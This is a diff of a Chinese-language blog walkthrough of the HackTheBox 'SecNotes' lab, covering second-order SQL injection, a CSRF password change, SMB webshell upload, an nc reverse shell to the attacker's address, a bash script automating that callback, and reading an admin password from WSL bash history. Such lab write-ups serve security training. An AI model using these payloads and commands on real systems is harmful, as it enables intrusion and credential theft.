@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;151  10.10.10.97                                                                                                              端口扫描80,445,8808: 1234">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;151  10.10.10.97   端口扫描80,445,8808: 1234567891011$ nmap -sT -p- --min-rate 10000 10.10.10.97Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-02-03 1">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SecNotes - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2020/02/17/SecNotes-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;151  10.10.10.97                                                                                                              端口扫描80,445,8808: 1234">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;151  10.10.10.97   端口扫描80,445,8808: 1234567891011$ nmap -sT -p- --min-rate 10000 10.10.10.97Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-02-03 1">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020303.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020304.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020305.jpg">
@@ -129,8 +129,15 @@
             </li>
         
             <li class="waves-block waves-effect">
+              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-coffee"></i>
+                Buy me a coffe
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link"></i>
+                <i class="icon icon-lg icon-link2"></i>
                 About
               </a>
             </li>
@@ -152,7 +159,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -220,163 +227,51 @@
 </li>
 <li><h2 id="10-10-10-97"><a href="#10-10-10-97" class="headerlink" title="10.10.10.97"></a>10.10.10.97</h2></li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020303.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020303.jpg" alt=""></p>
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>80,445,8808:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sT -p- --min-rate 10000 10.10.10.97</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-03 14:00 CST</span><br><span class="line">Nmap scan report for 10.10.10.97</span><br><span class="line">Host is up (0.070s latency).</span><br><span class="line">Not shown: 65532 filtered ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">80/tcp   open  http</span><br><span class="line">445/tcp  open  microsoft-ds</span><br><span class="line">8808/tcp open  ssports-bcast</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 2657.65 seconds</span><br></pre></td></tr></table></figure>
 
 <h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>一个登录页面：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020304.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020304.jpg" alt=""></p>
 <h2 id="8808"><a href="#8808" class="headerlink" title="8808"></a>8808</h2><p>IIS默认页面：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020305.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020305.jpg" alt=""></p>
 <h1 id="Secure-Notes"><a href="#Secure-Notes" class="headerlink" title="Secure Notes"></a>Secure Notes</h1><p>80端口随意注册登录：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020306.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020306.jpg" alt=""></p>
 <p>可以得到管理员用户名和提示信息</p>
 <h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>非预期，注册时用户名可以二次注入，如果用户名是<code>&#39; or 1=&#39;1</code>,登录后可以查看所有notes：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020307.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020307.jpg" alt=""></p>
 <p>New site里直接得到Tyler账号密码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\\secnotes.htb\new-site</span><br><span class="line">tyler &#x2F; 92g!mA8BGjOirkL%OG*&amp;</span><br></pre></td></tr></table></figure>
 
 <h2 id="Contact-csrf"><a href="#Contact-csrf" class="headerlink" title="Contact csrf"></a>Contact csrf</h2><p>Contact那里输入链接，会被直接访问：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020308.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020309.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020308.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020309.jpg" alt=""></p>
 <h2 id="change-password"><a href="#change-password" class="headerlink" title="change password"></a>change password</h2><p>修改密码默认是post，不校验原密码，但get形式也可以正常进行，那就是通过CSRF去修改管理员密码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.10.97&#x2F;change_pass.php?password&#x3D;Aa123456&amp;confirm_password&#x3D;Aa123456&amp;submit&#x3D;submit</span><br><span class="line">http:&#x2F;&#x2F;10.10.14.12:4445</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020310.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020311.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020310.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020311.jpg" alt=""></p>
 <h2 id="tyler"><a href="#tyler" class="headerlink" title="tyler"></a>tyler</h2><p>之后以tyler用户登录，得到账号密码：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020312.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020312.jpg" alt=""></p>
 <h1 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h1><p>直接smb查看可以看到newsite，就是8808端口那个：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020313.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020313.jpg" alt=""></p>
 <h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>参考80端口的php，直接smb传个php webshell到8808：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020314.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020314.jpg" alt=""></p>
 <h2 id="reverse-shell"><a href="#reverse-shell" class="headerlink" title="reverse shell"></a>reverse shell</h2><p>直接smb传个nc上去反弹shell</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc64.exe -e cmd.exe 10.10.14.12 4445</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020315.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020315.jpg" alt=""></p>
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>用户桌面目录得到user.txt:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020316.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020316.jpg" alt=""></p>
 <h2 id="shell-sh"><a href="#shell-sh" class="headerlink" title="shell.sh"></a>shell.sh</h2><p>因为有自动清除机制，可以脚本自动操作：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">"<span class="variable">$#</span>"</span> -ne 2 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"Usage: <span class="variable">$0</span> [ip] [port]"</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"Include ip and port to connect back to"</span></span><br><span class="line">    <span class="built_in">exit</span></span><br><span class="line"><span class="keyword">fi</span>;</span><br><span class="line"></span><br><span class="line">ip=<span class="variable">$1</span></span><br><span class="line">port=<span class="variable">$2</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"[*] Uploading webshell and nc.exe"</span></span><br><span class="line">smbclient -U <span class="string">'tyler%92g!mA8BGjOirkL%OG*&amp;'</span> //10.10.10.97/new-site -c <span class="string">'put miao.php miao.php'</span> || (<span class="built_in">echo</span> <span class="string">"[-] Upload php failed"</span> &amp;&amp; <span class="built_in">exit</span> 1)</span><br><span class="line">smbclient -U <span class="string">'tyler%92g!mA8BGjOirkL%OG*&amp;'</span> //10.10.10.97/new-site -c <span class="string">'put nc64.exe nc64.exe'</span> || (<span class="built_in">echo</span> <span class="string">"[-] Upload nc failed"</span> &amp;&amp; <span class="built_in">exit</span> 1)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"[+] Successfully uploaded webshell and nc.exe"</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"[*] Triggering nc shell callback to <span class="variable">$&#123;ip&#125;</span>:<span class="variable">$&#123;port&#125;</span>"</span></span><br><span class="line">curl <span class="string">"http://10.10.10.97:8808/0xdf.php?cmd=nc64.exe+-e+cmd.exe+<span class="variable">$&#123;ip&#125;</span>+<span class="variable">$&#123;port&#125;</span>"</span></span><br></pre></td></tr></table></figure>
 
 <h1 id="WSL"><a href="#WSL" class="headerlink" title="WSL"></a>WSL</h1><p>从根目录开始可以发现Distros\Ubuntu，这是win10 WSL：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020317.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020317.jpg" alt=""></p>
 <h2 id="bash-exe"><a href="#bash-exe" class="headerlink" title="bash.exe"></a>bash.exe</h2><p> 查找bash直接运行，可以得到ubuntu root：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">where &#x2F;R c:\ bash.exe</span><br><span class="line">c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe</span><br><span class="line"></span><br><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020318.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020318.jpg" alt=""></p>
 <h2 id="bash-history"><a href="#bash-history" class="headerlink" title=".bash_history"></a>.bash_history</h2><p>这个bash_history里有历史信息，里面有Administrator密码：</p>
 <blockquote>
 <p>看起来管理员正在尝试自己挂载本地文件系统，并且有管理员密码。甚至用户似乎都试图清除bash历史记录，但是由于当前会话是在退出时写入的，因此它仅清除该会话之前的历史记录。</p>
@@ -386,31 +281,10 @@
 <h2 id="Filesystem"><a href="#Filesystem" class="headerlink" title="Filesystem"></a>Filesystem</h2><p>另一种方式是通过filesystem获取信息,bash文件系统位于<code>AppData</code>文件夹<code>rootfs</code>夹中：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs&gt;</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020319.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020319.jpg" alt=""></p>
 <h1 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h1><p>然后直接smb或者psexec，得到Administrator用户桌面得到root.txt:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020320.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020321.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020320.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020321.jpg" alt=""></p>
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
 <li>HTB: SecNotes | 0xdf hacks stuff<br><a href="https://0xdf.gitlab.io/2019/01/19/htb-secnotes.html#intended-route-xsrf" target="_blank" rel="noopener">https://0xdf.gitlab.io/2019/01/19/htb-secnotes.html#intended-route-xsrf</a></li>
 <li><a href="https://www.hackthebox.eu/home/machines/writeup/151" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/writeup/151</a></li>
@@ -424,7 +298,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2021-02-03T07:49:44.205Z" itemprop="dateUpdated">2021-02-03 15:49:44</time>
+    Last updated: <time datetime="2021-02-03T07:49:44.205Z" itemprop="dateUpdated">2021-02-03 15:49:44</time>
 </span><br>
 
 
@@ -591,11 +465,11 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
-        <p><span>暗羽 &copy; 2014 - 2023</span>
+        <p><span>暗羽 &copy; 2014 - 2024</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
